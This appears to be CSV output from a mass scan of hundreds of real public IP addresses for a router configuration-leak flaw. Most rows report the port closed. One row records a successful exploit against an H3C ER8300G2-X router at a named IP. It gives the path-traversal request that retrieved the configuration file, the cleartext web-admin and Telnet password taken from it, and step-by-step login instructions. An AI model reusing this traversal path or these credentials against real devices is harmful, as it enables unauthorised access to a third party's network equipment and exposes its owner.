+183.17.145.79,4040,否,配置泄露,,,,,端口未开放，跳过检测
+180.165.30.87,18080,否,配置泄露,,,,,端口未开放，跳过检测
+115.199.59.203,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.211.50,82,否,配置泄露,,,,,端口未开放，跳过检测
+222.71.32.242,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.237.37.148,8020,否,配置泄露,,,,,端口未开放，跳过检测
+220.180.223.99,8081,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.197.84,8081,否,配置泄露,,,,,端口未开放，跳过检测
+117.41.139.47,8088,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.253.172,8090,否,配置泄露,,,,,端口未开放，跳过检测
+119.145.194.37,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.210.142.78,8181,否,配置泄露,,,,,端口未开放，跳过检测
+122.233.170.185,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.146.230,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.195.48.4,8081,否,配置泄露,,,,,端口未开放，跳过检测
+1.202.13.241,9443,否,配置泄露,,,,,端口未开放，跳过检测
+113.65.4.149,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.247.11,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.210.140.105,8181,否,配置泄露,,,,,端口未开放，跳过检测
+218.1.217.228,8800,否,配置泄露,,,,,端口未开放，跳过检测
+27.154.95.13,8888,否,配置泄露,,,,,端口未开放，跳过检测
+58.37.34.186,8800,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.14.194,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.21,8089,否,配置泄露,,,,,端口未开放，跳过检测
+125.118.210.214,9001,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.38.117,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.73.228,9000,否,配置泄露,,,,,端口未开放，跳过检测
+183.156.4.154,9001,否,配置泄露,,,,,端口未开放，跳过检测
+180.173.152.206,8800,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.203.101,4040,否,配置泄露,,,,,端口未开放，跳过检测
+106.87.15.67,8989,否,配置泄露,,,,,端口未开放，跳过检测
+116.232.86.207,33890,否,配置泄露,,,,,端口未开放，跳过检测
+113.250.201.229,8989,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.227,10001,否,配置泄露,,,,,端口未开放，跳过检测
+120.238.255.134,8080,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.145.192,8000,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.144.90,8000,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.100,8089,否,配置泄露,,,,,端口未开放，跳过检测
+112.98.178.30,7000,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.205,10001,否,配置泄露,,,,,端口未开放，跳过检测
+183.7.145.158,20000,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.26.211,8000,否,配置泄露,,,,,端口未开放，跳过检测
+115.204.236.115,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.41.95,10001,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.194.49,18080,否,配置泄露,,,,,端口未开放，跳过检测
+125.121.83.95,8181,否,配置泄露,,,,,端口未开放，跳过检测
+14.145.226.94,8088,否,配置泄露,,,,,端口未开放，跳过检测
+183.53.108.35,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.254.188,8090,否,配置泄露,,,,,端口未开放，跳过检测
+222.223.42.174,8088,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.35,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.81.246,8081,否,配置泄露,,,,,端口未开放，跳过检测
+122.243.142.245,8181,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.17,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.245.224.139,10001,否,配置泄露,,,,,端口未开放，跳过检测
+222.95.93.70,8088,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.26.68,8000,否,配置泄露,,,,,未检测到配置泄露漏洞
+115.227.191.11,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.245.224.241,10001,否,配置泄露,,,,,端口未开放，跳过检测
+121.235.237.50,8008,否,配置泄露,,,,,端口未开放，跳过检测
+115.197.33.183,8081,否,配置泄露,,,,,端口未开放，跳过检测
+218.78.176.3,8800,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.230.188,8089,否,配置泄露,,,,,端口未开放，跳过检测
+122.231.154.178,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.45.155,9090,否,配置泄露,,,,,端口未开放，跳过检测
+183.156.234.168,9001,否,配置泄露,,,,,端口未开放，跳过检测
+114.223.60.198,9001,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.36.223,9090,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.36.251,9090,否,配置泄露,,,,,端口未开放，跳过检测
+106.87.14.182,8989,否,配置泄露,,,,,端口未开放，跳过检测
+123.127.213.98,9090,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.213,10001,否,配置泄露,,,,,端口未开放，跳过检测
+106.87.14.203,8989,否,配置泄露,,,,,端口未开放，跳过检测
+106.87.14.88,8989,否,配置泄露,,,,,端口未开放，跳过检测
+183.6.7.211,8480,否,配置泄露,,,,,端口未开放，跳过检测
+61.145.203.82,808,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.145.178,4040,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.25,10001,否,配置泄露,,,,,端口未开放，跳过检测
+36.24.197.5,82,否,配置泄露,,,,,端口未开放，跳过检测
+36.27.121.85,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.203.112,4040,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.230.56,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.81.18,8089,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.146.17,4040,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.27.91,8000,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.202.38,10001,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.202.39,10001,否,配置泄露,,,,,端口未开放，跳过检测
+49.84.137.27,10000,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.208.149,10001,否,配置泄露,,,,,端口未开放，跳过检测
+125.121.126.194,10001,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.146.16,8000,否,配置泄露,,,,,端口未开放，跳过检测
+222.249.172.210,9999,否,配置泄露,,,,,端口未开放，跳过检测
+125.94.175.102,20000,否,配置泄露,,,,,端口未开放，跳过检测
+116.228.165.226,8080,否,配置泄露,,,,,端口未开放，跳过检测
+59.33.84.234,8080,否,配置泄露,,,,,端口未开放，跳过检测
+1.71.187.131,10001,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.208.66,10001,否,配置泄露,,,,,端口未开放，跳过检测
+39.153.130.219,60443,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.201.46,4040,否,配置泄露,,,,,端口未开放，跳过检测
+180.112.194.114,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.204.0.252,10001,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.163,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.193.114.190,8081,否,配置泄露,,,,,端口未开放，跳过检测
+125.83.83.96,8989,否,配置泄露,,,,,端口未开放，跳过检测
+183.49.245.248,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.201.182,4040,否,配置泄露,,,,,端口未开放，跳过检测
+183.6.78.12,8480,否,配置泄露,,,,,端口未开放，跳过检测
+120.192.26.5,8099,否,配置泄露,,,,,端口未开放，跳过检测
+171.83.99.149,81,否,配置泄露,,,,,端口未开放，跳过检测
+222.95.93.65,8088,否,配置泄露,,,,,端口未开放，跳过检测
+58.214.222.103,8008,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.163,8090,否,配置泄露,,,,,端口未开放，跳过检测
+1.85.58.174,10000,否,配置泄露,,,,,未检测到配置泄露漏洞
+14.19.211.70,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.98.39,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.195.53.137,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.4.40.100,8081,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.42.91,8989,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.253.215,8090,否,配置泄露,,,,,端口未开放，跳过检测
+117.41.138.241,8088,否,配置泄露,,,,,端口未开放，跳过检测
+112.26.242.215,888,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.202.72,10001,否,配置泄露,,,,,端口未开放，跳过检测
+125.120.92.120,8181,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.227,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.74.6,9000,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.220,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.47.217,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.16.34,9090,否,配置泄露,,,,,端口未开放，跳过检测
+125.85.183.72,8989,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.133.248,8083,否,配置泄露,,,,,端口未开放，跳过检测
+113.78.240.182,8090,否,配置泄露,,,,,端口未开放，跳过检测
+114.224.206.142,8008,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.136.120,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.119.160.7,8181,否,配置泄露,,,,,端口未开放，跳过检测
+14.145.226.110,8088,否,配置泄露,,,,,端口未开放，跳过检测
+218.72.54.80,8081,否,配置泄露,,,,,端口未开放，跳过检测
+121.235.140.94,9001,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.39.82,9090,否,配置泄露,,,,,端口未开放，跳过检测
+116.31.233.84,9999,否,配置泄露,,,,,端口未开放，跳过检测
+106.87.15.200,8989,否,配置泄露,,,,,端口未开放，跳过检测
+27.154.95.246,8888,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.144.40,8000,否,配置泄露,,,,,端口未开放，跳过检测
+117.132.14.44,9090,否,配置泄露,,,,,端口未开放，跳过检测
+115.199.198.158,9001,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.203.69,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.227.216.255,9001,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.63,10001,否,配置泄露,,,,,端口未开放，跳过检测
+125.121.74.11,8081,否,配置泄露,,,,,端口未开放，跳过检测
+106.87.15.3,8989,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.39.125,9090,否,配置泄露,,,,,端口未开放，跳过检测
+1.202.12.162,9443,否,配置泄露,,,,,端口未开放，跳过检测
+60.177.253.218,10001,否,配置泄露,,,,,端口未开放，跳过检测
+182.96.30.100,8088,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.39.44,8989,否,配置泄露,,,,,端口未开放，跳过检测
+125.122.11.214,10001,否,配置泄露,,,,,端口未开放，跳过检测
+49.74.244.215,60443,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.203.23,10001,否,配置泄露,,,,,端口未开放，跳过检测
+112.94.4.79,8000,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.203,8089,否,配置泄露,,,,,端口未开放，跳过检测
+14.153.176.157,4040,否,配置泄露,,,,,端口未开放，跳过检测
+220.249.7.106,10000,否,配置泄露,,,,,端口未开放，跳过检测
+220.165.94.114,8888,否,配置泄露,,,,,端口未开放，跳过检测
+220.190.35.86,8088,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.26.209,8000,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.40.160,8989,否,配置泄露,,,,,端口未开放，跳过检测
+58.213.79.43,9999,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.202.81,10001,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.206.61,10001,否,配置泄露,,,,,端口未开放，跳过检测
+114.250.92.119,18080,否,配置泄露,,,,,端口未开放，跳过检测
+183.10.99.67,20000,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.210.245,82,否,配置泄露,,,,,端口未开放，跳过检测
+180.109.12.15,9999,否,配置泄露,,,,,端口未开放，跳过检测
+60.176.236.30,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.17.91,10443,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.216.136,10001,否,配置泄露,,,,,端口未开放，跳过检测
+116.233.83.236,18080,否,配置泄露,,,,,端口未开放，跳过检测
+119.6.107.184,88,否,配置泄露,,,,,端口未开放，跳过检测
+220.184.45.48,10001,否,配置泄露,,,,,端口未开放，跳过检测
+60.8.220.58,18080,否,配置泄露,,,,,端口未开放，跳过检测
+220.182.18.165,8989,否,配置泄露,,,,,端口未开放，跳过检测
+60.21.140.222,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.142.29,8083,否,配置泄露,,,,,端口未开放，跳过检测
+183.157.78.208,8181,否,配置泄露,,,,,端口未开放，跳过检测
+114.223.90.91,8008,否,配置泄露,,,,,端口未开放，跳过检测
+113.98.243.161,8082,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.196.92,8081,否,配置泄露,,,,,端口未开放，跳过检测
+122.243.136.191,8181,否,配置泄露,,,,,端口未开放，跳过检测
+101.78.10.117,8080,否,配置泄露,,,,,端口未开放，跳过检测
+183.153.93.147,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.255.124,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.69.139.80,8090,否,配置泄露,,,,,端口未开放，跳过检测
+118.251.176.50,8090,否,配置泄露,,,,,端口未开放，跳过检测
+14.19.211.32,8090,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.202.249,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.250.207.217,8989,否,配置泄露,,,,,端口未开放，跳过检测
+14.145.226.134,8088,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.250,8090,否,配置泄露,,,,,端口未开放，跳过检测
+223.198.243.90,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.98.138,8090,否,配置泄露,,,,,端口未开放，跳过检测
+14.127.201.120,8082,否,配置泄露,,,,,端口未开放，跳过检测
+115.197.170.96,8081,否,配置泄露,,,,,端口未开放，跳过检测
+220.190.36.196,8088,否,配置泄露,,,,,端口未开放，跳过检测
+61.180.113.151,8088,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.192,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.62.165,8081,否,配置泄露,,,,,端口未开放，跳过检测
+180.168.65.106,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.65.248.235,8181,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.48,8081,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.44.80,8989,否,配置泄露,,,,,端口未开放，跳过检测
+220.249.15.194,10000,否,配置泄露,,,,,端口未开放，跳过检测
+183.128.243.234,9001,否,配置泄露,,,,,端口未开放，跳过检测
+110.90.108.106,9090,否,配置泄露,,,,,端口未开放，跳过检测
+60.177.157.2,8081,否,配置泄露,,,,,端口未开放，跳过检测
+61.144.189.229,8123,否,配置泄露,,,,,端口未开放，跳过检测
+117.30.73.100,8888,否,配置泄露,,,,,端口未开放，跳过检测
+61.140.112.2,8181,否,配置泄露,,,,,端口未开放，跳过检测
+115.199.52.254,9001,否,配置泄露,,,,,端口未开放，跳过检测
+117.30.44.130,9090,否,配置泄露,,,,,端口未开放，跳过检测
+61.180.113.187,8088,否,配置泄露,,,,,端口未开放，跳过检测
+113.111.184.167,999,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.200.27,4040,否,配置泄露,,,,,端口未开放，跳过检测
+218.106.182.182,8080,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.233,8089,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.144.31,4040,否,配置泄露,,,,,端口未开放，跳过检测
+49.85.218.230,60000,否,配置泄露,,,,,端口未开放，跳过检测
+111.47.12.195,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.44.75,9090,否,配置泄露,,,,,端口未开放，跳过检测
+220.184.242.210,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.106.30,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.228.193,10001,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.99.118,8090,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.203.170,10001,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.202.114,10001,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.203.134,10001,否,配置泄露,,,,,端口未开放，跳过检测
+1.202.13.211,9443,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.27.81,8000,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.144.33,8000,否,配置泄露,,,,,端口未开放，跳过检测
+183.7.149.171,20000,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.213,8081,否,配置泄露,,,,,端口未开放，跳过检测
+125.94.175.93,20000,否,配置泄露,,,,,端口未开放，跳过检测
+14.105.95.46,8989,否,配置泄露,,,,,端口未开放，跳过检测
+61.130.131.233,10001,否,配置泄露,,,,,端口未开放，跳过检测
+123.180.155.99,18080,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.10.89,1201,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.16.17,10001,否,配置泄露,,,,,端口未开放，跳过检测
+175.155.226.31,88,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.92,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.228.130,8089,否,配置泄露,,,,,端口未开放，跳过检测
+183.156.245.205,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.149.105,82,否,配置泄露,,,,,端口未开放，跳过检测
+222.95.93.69,8088,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.225.31,8081,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.109.91,9001,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.63.122,8081,否,配置泄露,,,,,端口未开放，跳过检测
+220.190.37.226,8088,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.17.139,10443,否,配置泄露,,,,,端口未开放，跳过检测
+122.232.84.136,8181,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.144.89,4040,否,配置泄露,,,,,端口未开放，跳过检测
+14.19.210.22,8090,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.253,8090,否,配置泄露,,,,,端口未开放，跳过检测
+58.208.150.52,10000,否,配置泄露,,,,,端口未开放，跳过检测
+111.35.39.250,8090,否,配置泄露,,,,,端口未开放，跳过检测
+125.122.182.109,8081,否,配置泄露,,,,,端口未开放，跳过检测
+223.198.242.198,8081,否,配置泄露,,,,,端口未开放，跳过检测
+222.181.10.146,8989,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.98.206,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.132.57,8083,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.254,8090,否,配置泄露,,,,,端口未开放，跳过检测
+220.177.6.106,8088,否,配置泄露,,,,,端口未开放，跳过检测
+58.49.25.83,8899,否,配置泄露,,,,,端口未开放，跳过检测
+60.186.241.118,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.119.160.100,8181,否,配置泄露,,,,,端口未开放，跳过检测
+117.30.75.243,8888,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.200.167,4040,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.228.99,10001,否,配置泄露,,,,,端口未开放，跳过检测
+59.175.205.245,8899,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.202.33,10001,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.10.6,1201,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.126,8089,否,配置泄露,,,,,端口未开放，跳过检测
+125.120.9.31,9001,否,配置泄露,,,,,端口未开放，跳过检测
+27.191.156.135,8888,否,配置泄露,,,,,端口未开放，跳过检测
+1.59.214.115,8888,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.19.229,9090,否,配置泄露,,,,,端口未开放，跳过检测
+220.190.22.180,8088,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.27.193,8000,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.240.96,10001,否,配置泄露,,,,,端口未开放，跳过检测
+117.30.46.36,9090,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.203.167,10001,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.91,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.111.143.145,999,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.230.178,8089,否,配置泄露,,,,,端口未开放，跳过检测
+59.49.11.91,808,否,配置泄露,,,,,端口未开放，跳过检测
+14.105.95.85,8989,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.200.230,4040,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.203.76,10001,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.206.238,10001,否,配置泄露,,,,,端口未开放，跳过检测
+219.159.102.126,7777,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.202.222,8989,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.61,10001,否,配置泄露,,,,,端口未开放，跳过检测
+218.90.91.117,10001,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.203.73,10001,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.145.7,8000,否,配置泄露,,,,,端口未开放，跳过检测
+125.92.172.47,18080,否,配置泄露,,,,,端口未开放，跳过检测
+14.212.200.91,10001,否,配置泄露,,,,,端口未开放，跳过检测
+171.83.102.91,81,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.228.154,18080,否,配置泄露,,,,,端口未开放，跳过检测
+115.196.30.81,82,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.216.165,10001,否,配置泄露,,,,,端口未开放，跳过检测
+219.128.36.151,18080,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.217.183,18080,否,配置泄露,,,,,端口未开放，跳过检测
+115.210.141.87,8181,否,配置泄露,,,,,端口未开放，跳过检测
+36.24.123.34,8081,否,配置泄露,,,,,端口未开放，跳过检测
+223.198.243.111,8081,否,配置泄露,,,,,端口未开放，跳过检测
+220.190.36.205,8088,否,配置泄露,,,,,端口未开放，跳过检测
+115.199.250.87,8081,否,配置泄露,,,,,端口未开放，跳过检测
+121.235.189.224,8008,否,配置泄露,,,,,端口未开放，跳过检测
+122.233.170.218,8181,否,配置泄露,,,,,端口未开放，跳过检测
+61.180.112.204,8088,否,配置泄露,,,,,端口未开放，跳过检测
+123.146.91.238,8081,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.227.6,8081,否,配置泄露,,,,,端口未开放，跳过检测
+103.219.187.34,880,否,配置泄露,,,,,端口未开放，跳过检测
+59.34.28.30,8083,否,配置泄露,,,,,端口未开放，跳过检测
+118.251.176.96,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.252.157,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.99.34,8090,否,配置泄露,,,,,端口未开放，跳过检测
+122.234.238.160,8081,否,配置泄露,,,,,端口未开放，跳过检测
+49.76.184.146,8008,否,配置泄露,,,,,端口未开放，跳过检测
+117.30.45.158,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.69.139.161,8090,否,配置泄露,,,,,端口未开放，跳过检测
+220.190.23.173,8088,否,配置泄露,,,,,端口未开放，跳过检测
+36.24.252.112,9001,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.66,10001,否,配置泄露,,,,,端口未开放，跳过检测
+121.235.227.58,9001,否,配置泄露,,,,,端口未开放，跳过检测
+59.32.37.123,9001,否,配置泄露,,,,,端口未开放，跳过检测
+1.59.213.182,8888,否,配置泄露,,,,,端口未开放，跳过检测
+125.120.186.31,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.18.124,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.215,8089,否,配置泄露,,,,,端口未开放，跳过检测
+219.145.1.51,1201,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.26.99,8000,否,配置泄露,,,,,端口未开放，跳过检测
+27.152.146.80,8888,否,配置泄露,,,,,端口未开放，跳过检测
+117.160.142.14,9009,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.144.171,8989,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.202.143,10001,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.145.24,8000,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.240.22,10001,否,配置泄露,,,,,端口未开放，跳过检测
+116.233.83.45,18080,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.16.6,10443,否,配置泄露,,,,,端口未开放，跳过检测
+36.22.249.85,10001,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.228.46,10001,否,配置泄露,,,,,端口未开放，跳过检测
+49.77.109.217,2048,否,配置泄露,,,,,端口未开放，跳过检测
+60.177.119.176,82,否,配置泄露,,,,,端口未开放，跳过检测
+112.95.173.241,1978,是,配置泄露,H3C,ff989796,ff989796,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://112.95.173.241:1978/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 158997 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: ff989796 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: ff989796 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: ff98 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.134.133
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 112.95.173.241 1978
+       密码: ff989796
+    2. Web登录: http://112.95.173.241:1978/userLogin.asp
+       密码: ff989796
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+116.31.232.107,9999,否,配置泄露,,,,,端口未开放，跳过检测
+114.250.20.173,2016,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.199.8,18080,否,配置泄露,,,,,端口未开放，跳过检测
+112.245.53.11,2012,否,配置泄露,,,,,端口未开放，跳过检测
+171.83.110.190,81,否,配置泄露,,,,,端口未开放，跳过检测
+183.7.16.167,20000,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.197.58,8081,否,配置泄露,,,,,端口未开放，跳过检测
+123.245.58.61,8088,否,配置泄露,,,,,端口未开放，跳过检测
+113.119.160.192,8181,否,配置泄露,,,,,端口未开放，跳过检测
+58.219.52.155,8008,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.85,8090,否,配置泄露,,,,,端口未开放，跳过检测
+122.234.240.5,10001,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.159,8090,否,配置泄露,,,,,端口未开放，跳过检测
+123.146.199.2,8081,否,配置泄露,,,,,端口未开放，跳过检测
+121.8.35.237,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.22.19.207,8181,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.167,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.200.246.162,8181,否,配置泄露,,,,,端口未开放，跳过检测
+112.95.173.217,1978,否,配置泄露,,,,,端口未开放，跳过检测
+118.251.178.233,8090,否,配置泄露,,,,,端口未开放，跳过检测
+117.30.46.114,9090,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.200.169,10001,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.95,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.44.244,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.18.199,9090,否,配置泄露,,,,,端口未开放，跳过检测
+183.129.84.143,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.206,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.228.87,8089,否,配置泄露,,,,,端口未开放，跳过检测
+116.17.236.72,9001,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.189.164,10001,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.240.34,10001,否,配置泄露,,,,,端口未开放，跳过检测
+1.59.209.152,8888,否,配置泄露,,,,,端口未开放，跳过检测
+222.181.10.196,8989,否,配置泄露,,,,,端口未开放，跳过检测
+121.236.191.94,60000,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.17.169,10443,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.17.210,10443,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.144.241,4040,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.145.205,4040,否,配置泄露,,,,,端口未开放，跳过检测
+114.221.46.7,5000,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.202.162,10001,否,配置泄露,,,,,端口未开放，跳过检测
+183.128.88.95,10001,否,配置泄露,,,,,端口未开放，跳过检测
+121.224.244.193,10000,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.203.64,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.198.160.244,82,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.18.13,10443,否,配置泄露,,,,,端口未开放，跳过检测
+183.7.16.143,20000,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.32.149,8989,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.235.172,10001,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.147.174,4040,否,配置泄露,,,,,端口未开放，跳过检测
+14.216.208.118,10001,否,配置泄露,,,,,端口未开放，跳过检测
+49.64.40.7,10000,否,配置泄露,,,,,端口未开放，跳过检测
